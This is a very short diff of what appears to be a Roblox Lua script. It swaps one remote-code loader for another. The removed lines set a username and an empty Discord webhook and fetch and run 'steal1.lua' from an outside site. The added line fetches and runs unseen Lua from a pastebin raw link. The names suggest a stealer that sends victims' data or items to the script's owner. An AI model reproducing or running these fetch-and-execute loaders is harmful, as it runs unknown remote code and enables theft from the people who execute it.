@@ -1,3 +1,1 @@
-```user =StayAw4yGirls
-discordwebhook =
-loadstring(game:HttpGet("https://oto.bio/steal1.lua"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/QDawnZXm"))()
